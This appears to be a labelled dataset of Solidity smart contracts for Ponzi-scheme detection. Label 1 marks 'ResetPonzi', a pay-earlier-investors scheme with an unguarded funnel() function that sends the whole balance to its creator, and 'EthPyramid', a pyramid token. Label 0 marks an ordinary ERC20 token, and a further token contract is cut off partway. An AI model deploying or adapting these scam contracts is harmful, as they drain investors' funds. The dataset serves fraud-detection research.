{"code":"contract ResetPonzi {\r\r\n    \r\r\n    struct Person {\r\r\n      address addr;\r\r\n    }\r\r\n    \r\r\n    struct NiceGuy {\r\r\n      address addr2;\r\r\n    }\r\r\n    \r\r\n    Person[] public persons;\r\r\n    NiceGuy[] public niceGuys;\r\r\n    \r\r\n    uint public payoutIdx = 0;\r\r\n    uint public currentNiceGuyIdx = 0;\r\r\n    uint public investor = 0;\r\r\n    \r\r\n    address public currentNiceGuy;\r\r\n    address public beta;\r\r\n    \r\r\n    function ResetPonzi() {\r\r\n        currentNiceGuy = msg.sender;\r\r\n        beta = msg.sender;\r\r\n    }\r\r\n    \r\r\n    \r\r\n    function() {\r\r\n        \r\r\n        if (msg.value != 9 ether) {\r\r\n            throw;\r\r\n        }\r\r\n        \r\r\n        if (investor > 8) {\r\r\n            uint ngidx = niceGuys.length;\r\r\n            niceGuys.length += 1;\r\r\n            niceGuys[ngidx].addr2 = msg.sender;\r\r\n            if (investor == 10) {\r\r\n                currentNiceGuy = niceGuys[currentNiceGuyIdx].addr2;\r\r\n                currentNiceGuyIdx += 1;\r\r\n            }\r\r\n        }\r\r\n        \r\r\n        if (investor < 9) {\r\r\n            uint idx = persons.length;\r\r\n            persons.length += 1;\r\r\n            persons[idx].addr = msg.sender;\r\r\n        }\r\r\n        \r\r\n        investor += 1;\r\r\n        if (investor == 11) {\r\r\n            investor = 0;\r\r\n        }\r\r\n        \r\r\n        currentNiceGuy.send(1 ether);\r\r\n        \r\r\n        while (this.balance >= 10 ether) {\r\r\n            persons[payoutIdx].addr.send(10 ether);\r\r\n            payoutIdx += 1;\r\r\n        }\r\r\n    }\r\r\n    \r\r\n    \r\r\n    function funnel() {\r\r\n        beta.send(this.balance);\r\r\n    }\r\r\n    \r\r\n    \r\r\n}","label":1}
{"code":"pragma solidity ^0.4.18;\r\r\n\/\/ THIS IS A REAL WORLD SIMULATION AS SOCIAL EXPERIMENT\r\r\n\/\/ By sending ETH to the smart contract, you&#39;re trusting \r\r\n\/\/ an uncaring mathematical gambling robot to entrust you with Tokens.\r\r\n\/\/ Every Time a Token is purchased, the contract increases the price \r\r\n\/\/ of the next token by a small percentage (about 0.25%). \r\r\n\/\/ Every time a Token is sold, the next Token is valued slightly less (about -0.25%).\r\r\n\/\/ At any time, you can sell your Tokens back to the Smart Contract\r\r\n\/\/ for 90% of the current price, or withdraw just the dividends \r\r\n\/\/ you&#39;ve accumulated!\r\r\n\/\/ This is a Simulation and kinda a Social Experiment \r\r\n\r\r\n\/\/ ------- DO NOT USE FUNDS YOU CAN&#39;T EFFORT TO LOSE -------\r\r\n\/\/ ------- THIS IS A PURE SIMULATION OF THE CAPABILITIES OF ETHEREUM CONTRACTS -------\r\r\n\r\r\n\/\/ If you want to WITHDRAW accumulated DIVIDENDS \r\r\n\/\/ 1. open MEW\/METAMASK\r\r\n\/\/ 2. Put this as data: 0x2e1a7d4d0000000000000000000000000000000000000000000000000000000000000000\r\r\n\/\/ 3. send 50.000+ gas\r\r\n\r\r\n\/\/ If you want to escape this contract REALLY FAST\r\r\n\/\/ 1. open MEW\/METAMASK\r\r\n\/\/ 2. Put this as data: 0xb1e35242\r\r\n\/\/ 3. send 150.000+ gas\r\r\n\/\/ That calls the getMeOutOfHere() method\r\r\n\r\r\ncontract ethpyramid {\r\r\n\tuint256 constant PRECISION = 0x10000000000000000;  \/\/ 2^64\r\r\n\t\/\/ CRR = 80 %\r\r\n\tint constant CRRN = 1;\r\r\n\tint constant CRRD = 2;\r\r\n\t\/\/ The price coefficient. Chosen such that at 1 token total supply\r\r\n\t\/\/ the reserve is 0.8 ether and price 1 ether\/token.\r\r\n\tint constant LOGC = -0x296ABF784A358468C;\r\r\n\t\r\r\n\tstring constant public name = \"EthPyramid\";\r\r\n\tstring constant public symbol = \"EPT\";\r\r\n\tuint8 constant public decimals = 18;\r\r\n\tuint256 public totalSupply;\r\r\n\t\/\/ amount of shares for each address (scaled number)\r\r\n\tmapping(address => uint256) public balanceOfOld;\r\r\n\t\/\/ allowance map, see erc20\r\r\n\tmapping(address => mapping(address => uint256)) public allowance;\r\r\n\t\/\/ amount payed out for each address (scaled number)\r\r\n\tmapping(address => int256) payouts;\r\r\n\t\/\/ sum of all payouts (scaled number)\r\r\n\tint256 totalPayouts;\r\r\n\t\/\/ amount earned for each share (scaled number)\r\r\n\tuint256 earningsPerShare;\r\r\n\t\r\r\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\r\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n\r\r\n\t\/\/address owner;\r\r\n\r\r\n\tfunction ethpyramid() public {\r\r\n\t\t\/\/owner = msg.sender;\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ These are functions solely created to appease the frontend\r\r\n\tfunction balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n        return balanceOfOld[_owner];\r\r\n    }\r\r\n\r\r\n\tfunction withdraw(uint tokenCount) \/\/ the parameter is ignored, yes\r\r\n      public\r\r\n      returns (bool)\r\r\n    {\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * PRECISION);\r\r\n\t\ttotalPayouts += (int256) (balance * PRECISION);\r\r\n\t\tmsg.sender.transfer(balance);\r\r\n\t\treturn true;\r\r\n    }\r\r\n\t\r\r\n\tfunction sellMyTokensDaddy() public {\r\r\n\t\tvar balance = balanceOf(msg.sender);\r\r\n\t\ttransferTokens(msg.sender, address(this),  balance); \/\/ this triggers the internal sell function\r\r\n\t}\r\r\n\r\r\n    function getMeOutOfHere() public {\r\r\n\t\tsellMyTokensDaddy();\r\r\n        withdraw(1); \/\/ parameter is ignored\r\r\n\t}\r\r\n\t\r\r\n\tfunction fund()\r\r\n      public\r\r\n      payable \r\r\n      returns (bool)\r\r\n    {\r\r\n      if (msg.value > 0.000001 ether)\r\r\n\t\t\tbuy();\r\r\n\t\telse\r\r\n\t\t\treturn false;\r\r\n\t  \r\r\n      return true;\r\r\n    }\r\r\n\r\r\n\tfunction buyPrice() public constant returns (uint) {\r\r\n\t\treturn getTokensForEther(1 finney);\r\r\n\t}\r\r\n\t\r\r\n\tfunction sellPrice() public constant returns (uint) {\r\r\n\t\treturn getEtherForTokens(1 finney);\r\r\n\t}\r\r\n\r\r\n\t\/\/ End of useless functions\r\r\n\r\r\n\t\/\/ Invariants\r\r\n\t\/\/ totalPayout\/Supply correct:\r\r\n\t\/\/   totalPayouts = \\sum_{addr:address} payouts(addr)\r\r\n\t\/\/   totalSupply  = \\sum_{addr:address} balanceOfOld(addr)\r\r\n\t\/\/ dividends not negative:\r\r\n\t\/\/   \\forall addr:address. payouts[addr] <= earningsPerShare * balanceOfOld[addr]\r\r\n\t\/\/ supply\/reserve correlation:\r\r\n\t\/\/   totalSupply ~= exp(LOGC + CRRN\/CRRD*log(reserve())\r\r\n\t\/\/   i.e. totalSupply = C * reserve()**CRR\r\r\n\t\/\/ reserve equals balance minus payouts\r\r\n\t\/\/   reserve() = this.balance - \\sum_{addr:address} dividends(addr)\r\r\n\r\r\n\tfunction transferTokens(address _from, address _to, uint256 _value) internal {\r\r\n\t\tif (balanceOfOld[_from] < _value)\r\r\n\t\t\trevert();\r\r\n\t\tif (_to == address(this)) {\r\r\n\t\t\tsell(_value);\r\r\n\t\t} else {\r\r\n\t\t    int256 payoutDiff = (int256) (earningsPerShare * _value);\r\r\n\t\t    balanceOfOld[_from] -= _value;\r\r\n\t\t    balanceOfOld[_to] += _value;\r\r\n\t\t    payouts[_from] -= payoutDiff;\r\r\n\t\t    payouts[_to] += payoutDiff;\r\r\n\t\t}\r\r\n\t\tTransfer(_from, _to, _value);\r\r\n\t}\r\r\n\t\r\r\n\tfunction transfer(address _to, uint256 _value) public {\r\r\n\t    transferTokens(msg.sender, _to,  _value);\r\r\n\t}\r\r\n\t\r\r\n    function transferFrom(address _from, address _to, uint256 _value) public {\r\r\n        var _allowance = allowance[_from][msg.sender];\r\r\n        if (_allowance < _value)\r\r\n            revert();\r\r\n        allowance[_from][msg.sender] = _allowance - _value;\r\r\n        transferTokens(_from, _to, _value);\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint256 _value) public {\r\r\n        \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n        \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n        \/\/  already 0 to mitigate the race condition described here:\r\r\n        \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();\r\r\n        allowance[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n    }\r\r\n\r\r\n\tfunction dividends(address _owner) public constant returns (uint256 amount) {\r\r\n\t\treturn (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) \/ PRECISION;\r\r\n\t}\r\r\n\r\r\n\tfunction withdrawOld(address to) public {\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * PRECISION);\r\r\n\t\ttotalPayouts += (int256) (balance * PRECISION);\r\r\n\t\tto.transfer(balance);\r\r\n\t}\r\r\n\r\r\n\tfunction balance() internal constant returns (uint256 amount) {\r\r\n\t\treturn this.balance - msg.value;\r\r\n\t}\r\r\n\tfunction reserve() public constant returns (uint256 amount) {\r\r\n\t\treturn balance()\r\r\n\t\t\t- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) \/ PRECISION) - 1;\r\r\n\t}\r\r\n\r\r\n\tfunction buy() internal {\r\r\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\r\r\n\t\t\trevert();\r\r\n\t\tvar sender = msg.sender;\r\r\n\t\t\/\/ 5 % of the amount is used to pay holders.\r\r\n\t\tvar fee = (uint)(msg.value \/ 10);\r\r\n\t\t\r\r\n\t\t\/\/ compute number of bought tokens\r\r\n\t\tvar numEther = msg.value - fee;\r\r\n\t\tvar numTokens = getTokensForEther(numEther);\r\r\n\r\r\n\t\tvar buyerfee = fee * PRECISION;\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ compute how the fee distributed to previous holders and buyer.\r\r\n\t\t\t\/\/ The buyer already gets a part of the fee as if he would buy each token separately.\r\r\n\t\t\tvar holderreward =\r\r\n\t\t\t    (PRECISION - (reserve() + numEther) * numTokens * PRECISION \/ (totalSupply + numTokens) \/ numEther)\r\r\n\t\t\t    * (uint)(CRRD) \/ (uint)(CRRD-CRRN);\r\r\n\t\t\tvar holderfee = fee * holderreward;\r\r\n\t\t\tbuyerfee -= holderfee;\r\r\n\t\t\r\r\n\t\t\t\/\/ Fee is distributed to all existing tokens before buying\r\r\n\t\t\tvar feePerShare = holderfee \/ totalSupply;\r\r\n\t\t\tearningsPerShare += feePerShare;\r\r\n\t\t}\r\r\n\t\t\/\/ add numTokens to total supply\r\r\n\t\ttotalSupply += numTokens;\r\r\n\t\t\/\/ add numTokens to balance\r\r\n\t\tbalanceOfOld[sender] += numTokens;\r\r\n\t\t\/\/ fix payouts so that sender doesn&#39;t get old earnings for the new tokens.\r\r\n\t\t\/\/ also add its buyerfee\r\r\n\t\tvar payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\t\ttotalPayouts += payoutDiff;\r\r\n\t}\r\r\n\t\r\r\n\tfunction sell(uint256 amount) internal {\r\r\n\t\tvar numEthers = getEtherForTokens(amount);\r\r\n\t\t\/\/ remove tokens\r\r\n\t\ttotalSupply -= amount;\r\r\n\t\tbalanceOfOld[msg.sender] -= amount;\r\r\n\t\t\r\r\n\t\t\/\/ fix payouts and put the ethers in payout\r\r\n\t\tvar payoutDiff = (int256) (earningsPerShare * amount + (numEthers * PRECISION));\r\r\n\t\tpayouts[msg.sender] -= payoutDiff;\r\r\n\t\ttotalPayouts -= payoutDiff;\r\r\n\t}\r\r\n\r\r\n\tfunction getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {\r\r\n\t\treturn fixedExp(fixedLog(reserve() + ethervalue)*CRRN\/CRRD + LOGC) - totalSupply;\r\r\n\t}\r\r\n\r\r\n\tfunction getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {\r\r\n\t\tif (tokens == totalSupply)\r\r\n\t\t\treturn reserve();\r\r\n\t\treturn reserve() - fixedExp((fixedLog(totalSupply - tokens) - LOGC) * CRRD\/CRRN);\r\r\n\t}\r\r\n\r\r\n\tint256 constant one       = 0x10000000000000000;\r\r\n\tuint256 constant sqrt2    = 0x16a09e667f3bcc908;\r\r\n\tuint256 constant sqrtdot5 = 0x0b504f333f9de6484;\r\r\n\tint256 constant ln2       = 0x0b17217f7d1cf79ac;\r\r\n\tint256 constant ln2_64dot5= 0x2cb53f09f05cc627c8;\r\r\n\tint256 constant c1        = 0x1ffffffffff9dac9b;\r\r\n\tint256 constant c3        = 0x0aaaaaaac16877908;\r\r\n\tint256 constant c5        = 0x0666664e5e9fa0c99;\r\r\n\tint256 constant c7        = 0x049254026a7630acf;\r\r\n\tint256 constant c9        = 0x038bd75ed37753d68;\r\r\n\tint256 constant c11       = 0x03284a0c14610924f;\r\r\n\r\r\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\r\r\n\t\tint32 scale = 0;\r\r\n\t\twhile (a > sqrt2) {\r\r\n\t\t\ta \/= 2;\r\r\n\t\t\tscale++;\r\r\n\t\t}\r\r\n\t\twhile (a <= sqrtdot5) {\r\r\n\t\t\ta *= 2;\r\r\n\t\t\tscale--;\r\r\n\t\t}\r\r\n\t\tint256 s = (((int256)(a) - one) * one) \/ ((int256)(a) + one);\r\r\n\t\t\/\/ The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11\r\r\n\t\t\/\/ approximates the function log(1+x)-log(1-x)\r\r\n\t\t\/\/ Hence R(s) = log((1+s)\/(1-s)) = log(a)\r\r\n\t\tvar z = (s*s) \/ one;\r\r\n\t\treturn scale * ln2 +\r\r\n\t\t\t(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11\/one))\r\r\n\t\t\t\t\/one))\/one))\/one))\/one))\/one);\r\r\n\t}\r\r\n\r\r\n\tint256 constant c2 =  0x02aaaaaaaaa015db0;\r\r\n\tint256 constant c4 = -0x000b60b60808399d1;\r\r\n\tint256 constant c6 =  0x0000455956bccdd06;\r\r\n\tint256 constant c8 = -0x000001b893ad04b3a;\r\r\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\r\r\n\t\tint256 scale = (a + (ln2_64dot5)) \/ ln2 - 64;\r\r\n\t\ta -= scale*ln2;\r\r\n\t\t\/\/ The polynomial R = 2 + c2*x^2 + c4*x^4 + ...\r\r\n\t\t\/\/ approximates the function x*(exp(x)+1)\/(exp(x)-1)\r\r\n\t\t\/\/ Hence exp(x) = (R(x)+x)\/(R(x)-x)\r\r\n\t\tint256 z = (a*a) \/ one;\r\r\n\t\tint256 R = ((int256)(2) * one) +\r\r\n\t\t\t(z*(c2 + (z*(c4 + (z*(c6 + (z*c8\/one))\/one))\/one))\/one);\r\r\n\t\texp = (uint256) (((R + a) * one) \/ (R - a));\r\r\n\t\tif (scale >= 0)\r\r\n\t\t\texp <<= scale;\r\r\n\t\telse\r\r\n\t\t\texp >>= -scale;\r\r\n\t\treturn exp;\r\r\n\t}\r\r\n\r\r\n\t\/*function destroy() external {\r\r\n\t    selfdestruct(owner);\r\r\n\t}*\/\r\r\n\r\r\n\tfunction () payable public {\r\r\n\t\tif (msg.value > 0)\r\r\n\t\t\tbuy();\r\r\n\t\telse\r\r\n\t\t\twithdrawOld(msg.sender);\r\r\n\t}\r\r\n}","label":1}
{"code":"pragma solidity 0.4.18;\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() public {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) onlyOwner public {\r\r\n    require(newOwner != address(0));\r\r\n    OwnershipTransferred(owner, newOwner);\r\r\n    owner = newOwner;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public totalSupply;\r\r\n  function balanceOf(address who) public constant returns (uint256);\r\r\n  function transfer(address to, uint256 value) public returns (bool);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) public constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value) public returns (bool);\r\r\n  function approve(address spender, uint256 value) public returns (bool);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances.\r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\r\n    require(_to != address(0));\r\r\n    require(_value <= balances[msg.sender]);\r\r\n\r\r\n    \/\/ SafeMath.sub will throw if there is not enough balance.\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of.\r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) internal allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amount of tokens to be transferred\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\r\n    require(_to != address(0));\r\r\n    require(_value <= balances[_from]);\r\r\n    require(_value <= allowed[_from][msg.sender]);\r\r\n\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   *\r\r\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\r\r\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\r\r\n   * race condition is to first reduce the spender&#39;s allowance to 0 and set the desired value afterwards:\r\r\n   * https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) public returns (bool) {\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifying the amount of tokens still available for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * approve should be called when allowed[_spender] == 0. To increment\r\r\n   * allowed value is better to use this function to avoid 2 calls (and wait until\r\r\n   * the first transaction is mined)\r\r\n   * From MonolithDAO Token.sol\r\r\n   *\/\r\r\n  function increaseApproval (address _spender, uint256 _addedValue) public returns (bool success) {\r\r\n    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function decreaseApproval (address _spender, uint256 _subtractedValue) public returns (bool success) {\r\r\n    uint256 oldValue = allowed[msg.sender][_spender];\r\r\n    if (_subtractedValue > oldValue) {\r\r\n      allowed[msg.sender][_spender] = 0;\r\r\n    } else {\r\r\n      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\r\n    }\r\r\n    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Mintable token\r\r\n * @dev Simple ERC20 Token example, with mintable token creation\r\r\n * @dev Issue: * https:\/\/github.com\/OpenZeppelin\/zeppelin-solidity\/issues\/120\r\r\n * Based on code by TokenMarketNet: https:\/\/github.com\/TokenMarketNet\/ico\/blob\/master\/contracts\/MintableToken.sol\r\r\n *\/\r\r\n\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n  event Mint(address indexed to, uint256 amount);\r\r\n  event MintFinished();\r\r\n\r\r\n  address public saleAgent;\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n\r\r\n  modifier canMint() {\r\r\n    require(!mintingFinished);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function setSaleAgent(address newSaleAgent) public {\r\r\n    require(msg.sender == saleAgent || msg.sender == owner);\r\r\n    saleAgent = newSaleAgent;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to mint tokens\r\r\n   * @param _to The address that will receive the minted tokens.\r\r\n   * @param _amount The amount of tokens to mint.\r\r\n   * @return A boolean that indicates if the operation was successful.\r\r\n   *\/\r\r\n  \/\/function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\r\r\n  function mint(address _to, uint256 _amount) canMint public returns (bool) {    \r\r\n    require(msg.sender == saleAgent || msg.sender == owner);\r\r\n    totalSupply = totalSupply.add(_amount);\r\r\n    balances[_to] = balances[_to].add(_amount);\r\r\n    Mint(_to, _amount);\r\r\n    Transfer(address(0), _to, _amount);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to stop minting new tokens.\r\r\n   * @return True if the operation was successful.\r\r\n   *\/\r\r\n  function finishMinting() canMint public returns (bool) {\r\r\n    require(msg.sender == saleAgent || msg.sender == owner);\r\r\n    mintingFinished = true;\r\r\n    MintFinished();\r\r\n    return true;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\ncontract ATFToken is MintableToken {\t\r\r\n    \r\r\n    string public constant name = \"AlgoTradingFun\";\r\r\n   \r\r\n    string public constant symbol = \"ATF\";\r\r\n    \r\r\n    uint32 public constant decimals = 18;\r\r\n\r\r\n    mapping (address => uint256) public locked;\r\r\n\r\r\n    bool public transfersEnabled = false;\r\r\n\r\r\n    event Burn(address indexed burner, uint256 value);\r\r\n\r\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\r\n      require(locked[msg.sender] < now);\r\r\n      require(transfersEnabled);\r\r\n      return super.transfer(_to, _value);\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\r\n      require(locked[_from] < now);\r\r\n      require(transfersEnabled);      \r\r\n      return super.transferFrom(_from, _to, _value);\r\r\n    }\r\r\n  \r\r\n    \/**\r\r\n     * @dev Function that enables\/disables transfers of token.\r\r\n     * @return True if the operation was successful.\r\r\n     *\/\r\r\n    function enableTransfers(bool _value) external onlyOwner {\r\r\n        transfersEnabled = _value;\r\r\n    }\r\r\n    \r\r\n    function lock(address addr, uint256 periodInDays) public {\r\r\n      require(locked[addr] < now && (msg.sender == saleAgent || msg.sender == addr));\r\r\n      locked[addr] = now + periodInDays * 1 days;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev Burns a specific amount of tokens.\r\r\n     * @param _value The amount of token to be burned.\r\r\n     *\/\r\r\n    function burn(uint256 _value) public {\r\r\n        require(_value > 0);\r\r\n        require(_value <= balances[msg.sender]);\r\r\n\r\r\n        \/\/ no need to require value <= totalSupply, since that would imply the\r\r\n        \/\/ sender&#39;s balance is greater than the totalSupply, which *should* be an assertion failure\r\r\n\r\r\n        address burner = msg.sender;\r\r\n        balances[burner] = balances[burner].sub(_value);\r\r\n        totalSupply = totalSupply.sub(_value);\r\r\n        Burn(burner, _value);\r\r\n    }\r\r\n\r\r\n    function () payable {\r\r\n      revert();\r\r\n    }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.8;\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------------------------\r\r\n\/\/ The Incent \/ ETH smart contract - to find out more, join the Incent Slack; http:\/\/incentinvites.herokuapp.com\/\r\r\n\/\/ A collaboration between Incent and Bok :)\r\r\n\/\/ Enjoy. (c) Incent Loyalty Pty Ltd and Bok Consulting Pty Ltd 2017. The MIT Licence.\r\r\n\/\/ ----------------------------------------------------------------------------------------------\r\r\n\r\r\n\/\/ Contract configuration\r\r\ncontract TokenConfig {\r\r\n    string public constant symbol = \"INC\";\r\r\n    string public constant name = \"Incent\";\r\r\n    uint8 public constant decimals = 8;  \/\/ 8 decimal places, the same as tokens on Wave\r\r\n    uint256 _totalSupply = 4601662500000000;\r\r\n}\r\r\n\r\r\n\/\/ ERC Token Standard #20 Interface\r\r\n\/\/ https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\ncontract ERC20Interface {\r\r\n    \/\/ Get the total token supply\r\r\n    function totalSupply() constant returns (uint256 totalSupply);\r\r\n\r\r\n    \/\/ Get the account balance of another account with address _owner\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\r\n\r\r\n    \/\/ Send _value amount of tokens to address _to\r\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/ Send _value amount of tokens from address _from to address _to\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/ Allow _spender to withdraw from your account, multiple times, up to the _value amount.\r\r\n    \/\/ If this function is called again it overwrites the current allowance with _value.\r\r\n    \/\/ this function is required for some DEX functionality\r\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/ Returns the amount which _spender is still allowed to withdraw from _owner\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n    \/\/ Triggered when tokens are transferred.\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n\r\r\n    \/\/ Triggered whenever approve(address _spender, uint256 _value) is called.\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\ncontract IncentToken is ERC20Interface, TokenConfig {\r\r\n    \/\/ Owner of this contract\r\r\n    address 